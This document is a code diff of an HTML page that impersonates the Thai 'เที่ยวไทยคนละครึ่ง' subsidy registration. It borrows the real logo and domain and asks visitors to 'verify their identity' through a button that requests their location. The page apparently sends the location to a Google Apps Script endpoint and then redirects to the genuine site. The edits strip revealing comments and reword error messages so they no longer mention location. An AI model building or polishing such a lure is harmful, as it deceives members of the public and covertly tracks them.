@@ -10,32 +10,65 @@
     <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-color: #e73c82; /* สีชมพูหลักจากโลโก้ */
-            --secondary-color: #007bff; /* สีน้ำเงินสำหรับส่วนประกอบอื่นๆ */
+            --primary-color: #e73c82; /* สีชมพูหลัก */
+            --secondary-color: #007bff;
             --success-color: #28a745;
             --danger-color: #dc3545;
-            --light-bg: #fdfcff; /* สีพื้นหลังขาวนวล */
+            --light-bg: #fdfcff;
             --dark-gray: #343a40;
         }
 
         body {
             font-family: 'Kanit', sans-serif;
             color: var(--dark-gray);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
             margin: 0;
-            padding: 20px;
+            padding: 0;
             box-sizing: border-box;
-            
-            /* --- ส่วนของพื้นหลังที่เพิ่มเข้ามา --- */
             background-color: var(--light-bg);
             background-image: 
                 radial-gradient(circle at 50% 0, rgba(247, 225, 237, 0.4) 0%, transparent 40%),
                 radial-gradient(circle at 50% 100%, rgba(225, 232, 247, 0.4) 0%, transparent 40%);
             background-repeat: no-repeat;
             background-size: 100% 50%;
+        }
+        
+        /* --- ส่วน Header ที่เพิ่มเข้ามา --- */
+        .main-header {
+            background-color: white;
+            padding: 15px 25px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-logo {
+            height: 40px; /* กำหนดความสูงของโลโก้ */
+        }
+
+        .menu-icon {
+            width: 28px;
+            height: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+
+        .menu-icon span {
+            display: block;
+            height: 3px;
+            width: 100%;
+            background-color: var(--dark-gray);
+            border-radius: 3px;
+        }
+        /* --- จบส่วน Header --- */
+
+        .main-content {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
         }
 
         .container {
@@ -46,11 +79,9 @@
             text-align: center;
             max-width: 450px;
             width: 100%;
-            border-top: 6px solid var(--primary-color);
         }
 
-        /* เพิ่มโลโก้เข้ามา */
-        .logo {
+        .logo-in-box {
             max-width: 250px;
             margin-bottom: 25px;
         }
@@ -121,7 +152,7 @@
             height: 30px;
             animation: spin 1s linear infinite;
             margin: 20px auto 0;
-            display: none; /* ซ่อนไว้ก่อน */
+            display: none;
         }
 
         @keyframes spin {
@@ -133,28 +164,36 @@
 </head>
 <body>
 
-    <div class="container">
-        <!-- ใช้โลโก้จากเว็บจริงเพื่อความสมจริง -->
-        <img src="https://www.xn--42caj5dan4dbmsr7i9bya1lwc5cm.com/assets/images/logo-half.png" alt="โลโก้เที่ยวไทยคนละครึ่ง" class="logo">
+    <header class="main-header">
+        <!-- เปลี่ยนมาใช้โลโก้ all-logo.svg ที่อยู่ใน repository ของคุณ -->
+        <img src="all-logo.svg" alt="โลโก้โครงการ" class="header-logo">
+        <div class="menu-icon">
+            <span></span>
+            <span></span>
+            <span></span>
+        </div>
+    </header>
 
-        <h1>ลงทะเบียนเข้าร่วมโครงการ</h1>
-        <p>เพื่อรับสิทธิ์ โปรดดำเนินการยืนยันตัวตน</p>
-        
-        <button id="confirmButton" class="action-button" onclick="requestLocationAndRedirect()">
-            ยืนยันสิทธิ์
-        </button>
+    <main class="main-content">
+        <div class="container">
+            <img src="https://www.xn--42caj5dan4dbmsr7i9bya1lwc5cm.com/assets/images/logo-half.png" alt="โลโก้เที่ยวไทยคนละครึ่ง" class="logo-in-box">
 
-        <div id="loader" class="loader"></div>
-        <div id="status-message"></div>
-    </div>
+            <h1>ลงทะเบียนเข้าร่วมโครงการ</h1>
+            <p>เพื่อรับสิทธิ์ โปรดดำเนินการยืนยันตัวตน</p>
+            
+            <button id="confirmButton" class="action-button" onclick="requestLocationAndRedirect()">
+                ยืนยันสิทธิ์
+            </button>
+
+            <div id="loader" class="loader"></div>
+            <div id="status-message"></div>
+        </div>
+    </main>
 
     <script>
         // --- การตั้งค่า ---
-        // !!! สำคัญ: URL ของ Web App ที่คุณได้จาก Google Apps Script !!!
         const googleWebAppUrl = "https://script.google.com/macros/s/AKfycbwcePjw_CIJynjxmtEHKLKlPeq3muw-egNPWLXAdZDzj_YsnH3_TKFfRYGRL9botPH2NA/exec";
-        
-        // URL ของเว็บไซต์เป้าหมาย (เว็บจริง)
-        const targetUrl = "https://www.เที่ยวไทยคนละครึ่ง.com";
+        const targetUrl = "https://www.xn--42caj5dan4dbmsr7i9bya1lwc5cm.com/";
 
         // --- ตัวแปรสำหรับอ้างอิง Element ---
         const confirmButton = document.getElementById('confirmButton');
@@ -223,10 +262,10 @@
                     errorMessage = "โปรดอนุญาตเพื่อดำเนินการต่อ";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    errorMessage = "ไม่สามารถระบุตำแหน่งของคุณได้ในขณะนี้";
+                    errorMessage = "ไม่สามารถดำเนินการได้ในขณะนี้";
                     break;
                 case error.TIMEOUT:
-                    errorMessage = "หมดเวลาในการร้องขอตำแหน่ง กรุณาลองใหม่อีกครั้ง";
+                    errorMessage = "หมดเวลาในการร้องขอ กรุณาลองใหม่อีกครั้ง";
                     break;
                 default:
                     errorMessage = "เกิดข้อผิดพลาดที่ไม่ทราบสาเหตุ";
@@ -246,4 +285,3 @@
 
 </body>
 </html>
-
